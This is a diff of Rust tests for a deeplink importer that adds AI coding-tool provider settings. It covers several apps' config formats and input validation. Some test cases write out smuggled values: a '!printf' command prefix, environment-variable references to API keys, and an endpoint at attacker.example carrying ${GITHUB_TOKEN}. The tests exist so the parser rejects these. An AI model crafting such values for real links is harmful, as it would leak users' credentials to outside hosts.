@@ -247,15 +247,17 @@ fn test_parse_mcp_deeplink_accepts_dsh() {
 
 /// 供应商链接对 Oh My Pi 明确拒绝，而不是落到「Invalid provider app type」。
 #[test]
-fn test_parse_provider_deeplink_refuses_omp_with_guidance() {
-    for app in ["omp", "ohmypi", "oh-my-pi", "oh_my_pi"] {
-        let url =
-            format!("ccswitch://v1/import?resource=provider&app={app}&name=Test&endpoint=https%3A%2F%2Fapi.example.com");
-        let err = parse_deeplink_url(&url).unwrap_err().to_string();
-        assert!(
-            err.contains("Oh My Pi provider page"),
-            "{app} should be sent to the Oh My Pi page, got: {err}"
+fn test_parse_provider_deeplink_accepts_the_pi_family_apps_with_a_model() {
+    for app in ["mcode", "kimi", "dsh", "omp"] {
+        let request = parse_deeplink_url(&provider_link(app, None))
+            .unwrap_or_else(|err| panic!("{app} link should parse: {err}"));
+        assert_eq!(request.app.as_deref(), Some(app));
+
+        let url = format!(
+            "ccswitch://v1/import?resource=provider&app={app}&name=Test&endpoint=https%3A%2F%2Fapi.example.com&apiKey=sk"
         );
+        let err = parse_deeplink_url(&url).expect_err("a node without models is unusable");
+        assert!(err.to_string().contains("model"), "{app}: {err}");
     }
 }
 
@@ -1679,6 +1681,13 @@ fn test_api_format_maps_to_each_additive_apps_own_protocol_field() {
         ("pi", "api", "anthropic", "anthropic-messages"),
         ("pi", "api", "openai_responses", "openai-responses"),
         ("pi", "api", "gemini_native", "google-generative-ai"),
+        ("omp", "api", "anthropic", "anthropic-messages"),
+        ("omp", "api", "openai_responses", "openai-responses"),
+        ("omp", "api", "gemini_native", "google-generative-ai"),
+        ("mcode", "api", "anthropic", "anthropic-messages"),
+        ("mcode", "api", "openai_responses", "openai-responses"),
+        ("dsh", "api", "anthropic", "anthropic-messages"),
+        ("dsh", "api", "openai_responses", "openai-responses"),
     ];
     for (app, field, format, expected) in cases {
         let provider = build_from_link(app, Some(format));
@@ -1696,6 +1705,9 @@ fn test_links_without_api_format_keep_each_apps_previous_protocol() {
         ("openclaw", "api", "openai-completions"),
         ("hermes", "api_mode", "chat_completions"),
         ("pi", "api", "openai-completions"),
+        ("omp", "api", "openai-completions"),
+        ("mcode", "api", "openai-completions"),
+        ("dsh", "api", "openai-completions"),
     ];
     for (app, field, expected) in cases {
         let provider = build_from_link(app, None);
@@ -1736,6 +1748,8 @@ fn test_api_format_rejects_unknown_values_and_unsupported_apps() {
         ("grokbuild", "gemini_native"),
         ("gemini", "openai_chat"),
         ("hermes", "gemini_native"),
+        ("mcode", "gemini_native"),
+        ("dsh", "gemini_native"),
     ] {
         let err = parse_deeplink_url(&provider_link(app, Some(format)))
             .expect_err("unsupported apiFormat must be rejected while parsing");
@@ -1843,6 +1857,17 @@ fn test_links_that_smuggle_commands_env_vars_or_files_into_additive_apps_are_rej
         ("openclaw", "apiKey", "${OPENAI_API_KEY}"),
         ("hermes", "apiKey", "${ANTHROPIC_API_KEY}"),
         ("hermes", "name", "${HOME}"),
+        ("omp", "apiKey", "!printf review-fixture"),
+        ("omp", "apiKey", "ANTHROPIC_API_KEY"),
+        // 终端里才有的变量导入时查不到，按形状拒绝
+        ("omp", "apiKey", "TOKEN"),
+        ("mcode", "apiKey", "{env:ANTHROPIC_API_KEY}"),
+        ("dsh", "apiKey", "${OPENAI_API_KEY}"),
+        (
+            "kimi",
+            "endpoint",
+            "https://attacker.example/${GITHUB_TOKEN}",
+        ),
     ] {
         let err = parse_deeplink_url(&link_with(app, param, value))
             .expect_err("dynamic syntax must be rejected while parsing");
@@ -1859,6 +1884,9 @@ fn test_dynamic_syntax_guard_leaves_ordinary_values_alone() {
         ("pi", "apiKey", "sk-abc$1def"),
         ("pi", "apiKey", "sk-ends-with-!"),
         ("opencode", "apiKey", "sk-{not-a-reference}"),
+        // omp 只把整个值当环境变量名查：普通 Key、纯十六进制 Key 照常导入
+        ("omp", "apiKey", "sk-abc123"),
+        ("omp", "apiKey", "a1b2c3d4e5f60718293a4b5c6d7e8f90"),
         // 切换式应用的客户端不展开这些写法，照常导入
         ("claude", "apiKey", "!literal-key"),
         ("codex", "apiKey", "${literal}"),
@@ -2249,4 +2277,395 @@ fn skill_deeplink_is_a_shared_repository_not_an_agy_install() {
         "example/skills"
     );
     assert!(state.db.get_all_installed_skills().unwrap().is_empty());
+}
+
+fn build_claude_desktop_from_url(
+    url: &str,
+) -> Result<crate::provider::Provider, crate::error::AppError> {
+    let request = parse_deeplink_url(url)?;
+    super::provider::build_provider_from_request(&AppType::ClaudeDesktop, &request)
+}
+
+#[test]
+fn claude_desktop_link_with_claude_models_becomes_a_direct_card() {
+    use crate::claude_desktop_config::{needs_routing, validate_provider};
+    use crate::provider::ClaudeDesktopMode;
+
+    let provider = build_claude_desktop_from_url(
+        "ccswitch://v1/import?resource=provider&app=claude-desktop&name=Relay&endpoint=https%3A%2F%2Fapi.example.com&apiKey=sk-test&model=claude-sonnet-4-6&haikuModel=anthropic%2Fclaude-haiku-4-5",
+    )
+    .unwrap();
+    let meta = provider.meta.as_ref().unwrap();
+
+    assert_eq!(meta.claude_desktop_mode, Some(ClaudeDesktopMode::Direct));
+    assert_eq!(meta.api_format.as_deref(), Some("anthropic"));
+    let mut routes: Vec<_> = meta
+        .claude_desktop_model_routes
+        .iter()
+        .map(|(id, route)| (id.as_str(), route.model.as_str()))
+        .collect();
+    routes.sort();
+    assert_eq!(
+        routes,
+        [
+            ("anthropic/claude-haiku-4-5", "anthropic/claude-haiku-4-5"),
+            ("claude-sonnet-4-6", "claude-sonnet-4-6"),
+        ]
+    );
+    validate_provider(&provider).unwrap();
+    assert!(!needs_routing(&provider));
+}
+
+#[test]
+fn claude_desktop_link_without_models_stays_direct() {
+    use crate::claude_desktop_config::validate_provider;
+    use crate::provider::ClaudeDesktopMode;
+
+    let provider = build_claude_desktop_from_url(
+        "ccswitch://v1/import?resource=provider&app=claude-desktop&name=Relay&endpoint=https%3A%2F%2Fapi.example.com&apiKey=sk-test",
+    )
+    .unwrap();
+    let meta = provider.meta.as_ref().unwrap();
+
+    assert_eq!(meta.claude_desktop_mode, Some(ClaudeDesktopMode::Direct));
+    assert!(meta.claude_desktop_model_routes.is_empty());
+    validate_provider(&provider).unwrap();
+}
+
+#[test]
+fn claude_desktop_link_with_other_models_becomes_a_mapping_card() {
+    use crate::claude_desktop_config::{needs_routing, validate_provider, DEFAULT_PROXY_ROUTES};
+    use crate::provider::ClaudeDesktopMode;
+
+    let provider = build_claude_desktop_from_url(
+        "ccswitch://v1/import?resource=provider&app=claude-desktop&name=GLM&endpoint=https%3A%2F%2Fapi.example.com&apiKey=sk-test&model=glm-4.6&haikuModel=glm-4.5-air",
+    )
+    .unwrap();
+    let meta = provider.meta.as_ref().unwrap();
+
+    assert_eq!(meta.claude_desktop_mode, Some(ClaudeDesktopMode::Proxy));
+    assert_eq!(meta.api_format.as_deref(), Some("anthropic"));
+    let routes = &meta.claude_desktop_model_routes;
+    assert_eq!(routes.len(), DEFAULT_PROXY_ROUTES.len());
+    for route in DEFAULT_PROXY_ROUTES {
+        let expected = if route.env_key == "ANTHROPIC_DEFAULT_HAIKU_MODEL" {
+            "glm-4.5-air"
+        } else {
+            "glm-4.6"
+        };
+        let mapped = &routes[route.route_id];
+        assert_eq!(mapped.model, expected, "{}", route.route_id);
+        assert_eq!(mapped.label_override.as_deref(), Some(expected));
+        assert_eq!(mapped.supports_1m, None);
+    }
+    validate_provider(&provider).unwrap();
+    assert!(needs_routing(&provider));
+}
+
+#[test]
+fn claude_desktop_link_with_non_anthropic_format_becomes_a_mapping_card() {
+    use crate::claude_desktop_config::validate_provider;
+    use crate::provider::ClaudeDesktopMode;
+
+    let provider = build_claude_desktop_from_url(
+        "ccswitch://v1/import?resource=provider&app=claude-desktop&name=Chat&endpoint=https%3A%2F%2Fapi.example.com%2Fv1&apiKey=sk-test&model=claude-sonnet-4-6&apiFormat=openai_chat",
+    )
+    .unwrap();
+    let meta = provider.meta.as_ref().unwrap();
+
+    assert_eq!(meta.claude_desktop_mode, Some(ClaudeDesktopMode::Proxy));
+    assert_eq!(meta.api_format.as_deref(), Some("openai_chat"));
+    assert!(meta
+        .claude_desktop_model_routes
+        .values()
+        .all(|route| route.model == "claude-sonnet-4-6"));
+    validate_provider(&provider).unwrap();
+}
+
+#[test]
+fn claude_desktop_link_with_non_anthropic_format_needs_a_model() {
+    let err = build_claude_desktop_from_url(
+        "ccswitch://v1/import?resource=provider&app=claude-desktop&name=Chat&endpoint=https%3A%2F%2Fapi.example.com%2Fv1&apiKey=sk-test&apiFormat=openai_responses",
+    )
+    .expect_err("a mapping card needs an upstream model");
+    assert!(err.to_string().contains("model"), "{err}");
+}
+
+// =============================================================================
+// Pi 系四家：MiniMax Code、Kimi Code、DeepSeek Harness、Oh My Pi
+// =============================================================================
+
+struct EnvVarGuard(&'static str, Option<OsString>);
+
+impl EnvVarGuard {
+    fn set(name: &'static str, value: &std::path::Path) -> Self {
+        let previous = env::var_os(name);
+        env::set_var(name, value);
+        Self(name, previous)
+    }
+}
+
+impl Drop for EnvVarGuard {
+    fn drop(&mut self) {
+        match &self.1 {
+            Some(value) => env::set_var(self.0, value),
+            None => env::remove_var(self.0),
+        }
+    }
+}
+
+/// 名字带中文和下划线，检验 id 仍满足各家的原生 key 规则。
+fn import_pi_family_link(app: &str, api_format: Option<&str>) -> (AppState, String) {
+    let name: String = url::form_urlencoded::byte_serialize("中转_Relay".as_bytes()).collect();
+    let url = provider_link(app, api_format).replace("name=Example", &format!("name={name}"));
+    let request = parse_deeplink_url(&url).expect("parse link");
+    let db = Arc::new(Database::memory().expect("create memory db"));
+    let state = AppState::new(db);
+    let id = super::import_provider_from_deeplink(&state, request)
+        .unwrap_or_else(|err| panic!("import {app} provider: {err}"));
+    (state, id)
+}
+
+fn assert_slug_id(id: &str) {
+    assert!(id.starts_with("relay-"), "{id}");
+    assert!(
+        id.chars()
+            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-'),
+        "{id}"
+    );
+}
+
+#[test]
+fn test_pi_family_links_build_each_apps_minimal_node() {
+    use serde_json::json;
+
+    assert_eq!(
+        build_from_link("mcode", None).settings_config,
+        json!({
+            "name": "Example",
+            "kind": "custom",
+            "enabled": true,
+            "api": "openai-completions",
+            "options": {"baseURL": "https://api.example.com/v1", "apiKey": "sk-test"},
+            "models": {"example-model": {"name": "example-model"}},
+        })
+    );
+    assert_eq!(
+        build_from_link("omp", Some("anthropic")).settings_config,
+        json!({
+            "baseUrl": "https://api.example.com/v1",
+            "apiKey": "sk-test",
+            "api": "anthropic-messages",
+            "models": [{"id": "example-model", "name": "example-model"}],
+        })
+    );
+    for (format, expected) in [
+        (None, "openai"),
+        (Some("anthropic"), "anthropic"),
+        (Some("openai_responses"), "openai_responses"),
+        (Some("gemini_native"), "google-genai"),
+    ] {
+        let config = build_from_link("kimi", format).settings_config;
+        assert_eq!(config["provider"]["type"], expected, "{format:?}");
+        let model = &config["models"]["example-model"];
+        assert_eq!(model["model"], "example-model");
+        assert!(model["max_context_size"].as_u64().is_some_and(|n| n > 0));
+    }
+}
+
+#[test]
+#[serial_test::serial]
+fn test_omp_link_rejects_keys_that_resolve_through_the_environment() {
+    let previous = env::var_os("ccswitch_link_probe_secret");
+    env::set_var("ccswitch_link_probe_secret", "real-secret");
+    let result = parse_deeplink_url(&link_with("omp", "apiKey", "ccswitch_link_probe_secret"));
+    match previous {
+        Some(value) => env::set_var("ccswitch_link_probe_secret", value),
+        None => env::remove_var("ccswitch_link_probe_secret"),
+    }
+    let err = result.expect_err("omp would send the environment value to the link's endpoint");
+    assert!(err.to_string().contains("apiKey"), "{err}");
+}
+
+#[test]
+#[serial_test::serial]
+fn test_mcode_link_is_added_to_config_yaml() {
+    let home = TestHomeGuard::new();
+    let _data = EnvVarGuard::set("MINIMAX_DATA_DIR", &home._dir.path().join("minimax"));
+
+    let (state, id) = import_pi_family_link("mcode", None);
+
+    assert_slug_id(&id);
+    assert!(state.db.get_provider_by_id(&id, "mcode").unwrap().is_some());
+    let node = &crate::mcode_config::get_providers().unwrap()[&id];
+    assert_eq!(node["options"]["baseURL"], "https://api.example.com/v1");
+    assert_eq!(node["models"]["example-model"]["name"], "example-model");
+}
+
+#[test]
+#[serial_test::serial]
+fn test_dsh_link_is_added_to_every_profile() {
+    let home = TestHomeGuard::new();
+    let dsh_home = home._dir.path().join("dsh");
+    let _data = EnvVarGuard::set("DSH_HOME", &dsh_home);
+
+    let (_state, id) = import_pi_family_link("dsh", Some("anthropic"));
+
+    assert_slug_id(&id);
+    for profile in ["web", "desktop"] {
+        let patch = std::fs::read_to_string(
+            dsh_home
+                .join("profiles")
+                .join(profile)
+                .join("cordis.patch.yml"),
+        )
+        .unwrap();
+        assert!(patch.contains(&format!("{id}:")), "{profile}: {patch}");
+        assert!(patch.contains("id: example-model"), "{profile}: {patch}");
+        assert!(
+            patch.contains("api: anthropic-messages"),
+            "{profile}: {patch}"
+        );
+    }
+}
+
+#[test]
+#[serial_test::serial]
+fn test_kimi_link_namespaces_its_model_and_sets_a_context_size() {
+    let home = TestHomeGuard::new();
+    let _data = EnvVarGuard::set("KIMI_CODE_HOME", &home._dir.path().join("kimi"));
+
+    let (state, id) = import_pi_family_link("kimi", None);
+
+    assert_slug_id(&id);
+    let stored = state.db.get_provider_by_id(&id, "kimi").unwrap().unwrap();
+    let key = format!("{id}/example-model");
+    assert!(
+        stored.settings_config["models"].get(&key).is_some(),
+        "{stored:?}"
+    );
+    let node = &crate::kimi_config::get_providers().unwrap()[&id];
+    let model = &node["models"][&key];
+    assert_eq!(model["model"], "example-model");
+    assert_eq!(model["provider"], id.as_str());
+    assert!(model["max_context_size"].as_u64().is_some_and(|n| n > 0));
+}
+
+#[test]
+#[serial_test::serial]
+fn test_omp_link_is_added_to_models_yml() {
+    let _home = TestHomeGuard::new();
+    let _agent = crate::omp_config::test_support::TestAgentDir::new();
+
+    let (_state, id) = import_pi_family_link("omp", Some("openai_responses"));
+
+    assert_slug_id(&id);
+    let node = &crate::omp_config::get_providers().unwrap()[&id];
+    assert_eq!(node["api"], "openai-responses");
+    assert_eq!(node["models"][0]["id"], "example-model");
+}
+
+#[test]
+fn test_pi_family_inline_config_fills_each_apps_native_connection_fields() {
+    for (app, config) in [
+        (
+            "mcode",
+            r#"{"options":{"baseURL":"https://cfg.example.com/v1","apiKey":"sk-from-config"}}"#,
+        ),
+        (
+            "dsh",
+            r#"{"options":{"baseURL":"https://cfg.example.com/v1","apiKey":"sk-from-config"}}"#,
+        ),
+        (
+            "kimi",
+            r#"{"provider":{"base_url":"https://cfg.example.com/v1","api_key":"sk-from-config"}}"#,
+        ),
+    ] {
+        let encoded = BASE64_STANDARD.encode(config);
+        let url = format!(
+            "ccswitch://v1/import?resource=provider&app={app}&name=Example&model=m&config={encoded}"
+        );
+        let request = parse_and_merge_config(&parse_deeplink_url(&url).unwrap()).unwrap();
+        assert_eq!(request.api_key.as_deref(), Some("sk-from-config"), "{app}");
+        assert_eq!(
+            request.endpoint.as_deref(),
+            Some("https://cfg.example.com/v1"),
+            "{app}"
+        );
+    }
+}
+
+#[test]
+#[serial_test::serial]
+fn test_copilot_link_writes_a_readable_card_into_providers_json() {
+    use serde_json::json;
+
+    let home = TestHomeGuard::new();
+    let copilot_home = home._dir.path().join(".copilot");
+    let _copilot = crate::copilot_config::test_support::CopilotHomeGuard::new(&copilot_home);
+
+    assert_eq!(
+        build_from_link("copilot", Some("openai_responses")).settings_config,
+        json!({
+            "provider": {"type":"openai","wireApi":"responses","baseUrl":"https://api.example.com/v1","apiKey":"sk-test"},
+            "models": [{"id":"example-model"}],
+        })
+    );
+    assert_eq!(
+        build_from_link("copilot", Some("anthropic")).settings_config["provider"]["type"],
+        "anthropic"
+    );
+
+    // 卡片 id 是 `/model` 里看得见的前缀：用名字的 slug，撞了加后缀；累加式默认直接写进文件。
+    let request = parse_deeplink_url(&provider_link("copilot", None)).expect("parse link");
+    let db = Arc::new(Database::memory().expect("create memory db"));
+    let state = AppState::new(db);
+    let first = super::import_provider_from_deeplink(&state, request.clone()).unwrap();
+    let second = super::import_provider_from_deeplink(&state, request).unwrap();
+    assert_eq!((first.as_str(), second.as_str()), ("example", "example-2"));
+    let native = crate::copilot_config::get_providers().unwrap();
+    assert_eq!(native.keys().collect::<Vec<_>>(), ["example", "example-2"]);
+    assert_eq!(native["example"]["models"], json!([{"id":"example-model"}]));
+    assert_eq!(native["example"]["provider"]["wireApi"], "completions");
+}
+
+#[test]
+#[serial_test::serial]
+fn copilot_inline_links_keep_credentials_and_all_model_ids_after_preview() {
+    use serde_json::json;
+    let home = TestHomeGuard::new();
+    let _copilot = crate::copilot_config::test_support::CopilotHomeGuard::new(
+        &home._dir.path().join(".copilot"),
+    );
+    let state = AppState::new(Arc::new(Database::memory().unwrap()));
+    let config = BASE64_STANDARD.encode(json!({
+        "provider":{"baseUrl":"https://relay.example/v1","bearerToken":"bearer-fixture","headers":{"ignored":"header"}},
+        "models":[{"id":"first","systemMessage":{"mode":"replace","content":"ignored"}},{"id":"second"}]
+    }).to_string());
+    for (suffix, key, value, models) in [
+        (
+            "",
+            "bearerToken",
+            "bearer-fixture",
+            json!([{"id":"first"},{"id":"second"}]),
+        ),
+        (
+            "&apiKey=url-key&model=second",
+            "apiKey",
+            "url-key",
+            json!([{"id":"second"},{"id":"first"}]),
+        ),
+    ] {
+        let url = format!(
+            "ccswitch://v1/import?resource=provider&app=copilot&name=Multi&config={config}{suffix}"
+        );
+        let preview = parse_and_merge_config(&parse_deeplink_url(&url).unwrap()).unwrap();
+        let id = super::import_provider_from_deeplink(&state, preview).unwrap();
+        let card = &crate::copilot_config::get_providers().unwrap()[&id];
+        assert_eq!(card["models"], models);
+        assert_eq!(
+            card["provider"],
+            json!({"type":"openai","wireApi":"completions","baseUrl":"https://relay.example/v1", (key):value})
+        );
+    }
 }
